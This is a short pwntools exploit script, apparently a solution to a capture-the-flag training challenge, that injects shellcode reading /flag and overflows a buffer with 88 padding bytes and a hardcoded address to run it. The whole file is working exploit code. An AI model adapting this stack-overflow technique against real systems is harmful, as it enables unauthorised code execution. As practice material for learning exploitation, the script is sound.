#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

-----------------------------
'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-1-0')
p = elf.process()

assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

buffer_addr = p64(0x28864000)

delta_len = 88
bytestream = b'A' * delta_len + buffer_addr

p.sendline(shellcode)
p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
